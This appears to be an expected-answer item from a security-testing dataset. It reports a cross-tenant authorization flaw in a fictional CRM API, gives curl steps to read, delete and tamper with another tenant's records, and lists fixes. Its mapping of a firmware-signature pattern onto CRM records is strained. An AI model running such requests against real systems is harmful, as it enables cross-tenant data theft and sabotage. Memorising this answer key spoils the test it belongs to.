# Expected Response

## System
- System: PipelinePro Sales API v5.5.0
- Domain: B2B SaaS / CRM
- Example ID: BOLA-0084
- Risk ID: RISK-45-084

## Findings

### 1. Pattern 4.5 — Record Modification Without Integrity Validation: Cross-Tenant CRM DELETE on `/api/v3/records/:id` (HAR Primary)

The `GET/PATCH/DELETE /api/v3/records/:id` endpoint queries by `record_id` only, without filtering by `owner_id` or `tenant_id`. In the B2B SaaS/CRM context, Pattern 4.5 "firmware update without signature validation" applies to record modification operations: cross-tenant DELETE and PATCH succeed because no signature, origin, or ownership integrity check is performed before executing the write operation. Any authenticated user can modify or delete another tenant's CRM sales records.

**Evidence from HAR:**
- Request: `DELETE /api/v3/records/REC-2084` from `ORG-E5FF` (`X-Tenant-ID: ORG-E5FF`)
- Response `tenantId: "ORG-28EB"` — cross-tenant deletion confirmed
- Response returns deleted record's `sensitiveData: "CONFIDENTIAL: cross-tenant data for ORG-28EB"`
- HTTP status: 200 — no integrity or ownership check triggered

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s "https://api.pipelinepro-sal.example.com/api/v3/records/REC-1084" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-E5FF>" \
  -H "X-Tenant-ID: ORG-E5FF"
```
**Expected:** Returns own record with `tenantId: "ORG-E5FF"`.

**Step 2 — Cross-tenant CRM record DELETE without integrity check (primary HAR attack):**
```bash
curl -s -X DELETE "https://api.pipelinepro-sal.example.com/api/v3/records/REC-2084" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-E5FF>" \
  -H "X-Tenant-ID: ORG-E5FF"
```
**Vulnerable outcome:** Returns `tenantId: "ORG-28EB"` — competitor's CRM sales record deleted with no integrity validation.

**Step 3 — Cross-tenant CRM record PATCH: corrupt sales pipeline data (Pattern 4.5 write without validation):**
```bash
curl -s -X PATCH "https://api.pipelinepro-sal.example.com/api/v3/records/REC-2084" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-E5FF>" \
  -H "X-Tenant-ID: ORG-E5FF" \
  -H "Content-Type: application/json" \
  -d '{"status": "lost", "sensitive_data": "pipeline_data_corrupted_by_attacker"}'
```
**Vulnerable outcome:** Competitor's CRM deal marked as lost — B2B SaaS sabotage, revenue impact.

**Step 4 — Cross-tenant CRM record read:**
```bash
curl -s "https://api.pipelinepro-sal.example.com/api/v3/records/REC-2084" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-E5FF>" \
  -H "X-Tenant-ID: ORG-E5FF"
```
**Vulnerable outcome:** Returns `tenantId: "ORG-28EB"` — competitor's sales pipeline intelligence exposed.

## Secure Outcome
```json
{ "error": "Forbidden", "code": 403 }
```

## Remediation
- Add `WHERE record_id = $id AND owner_id = $jwtSub AND tenant_id = $jwtTenantId` to all record queries (RISK-45-084).
- Validate record ownership before any write operation (DELETE, PATCH).
- Centralize authorization middleware: never resolve record IDs without ownership check.
- Use non-sequential UUIDs for record IDs to reduce enumeration risk.
- Add regression test: Tenant A token requests Tenant B record — assert 403/404.
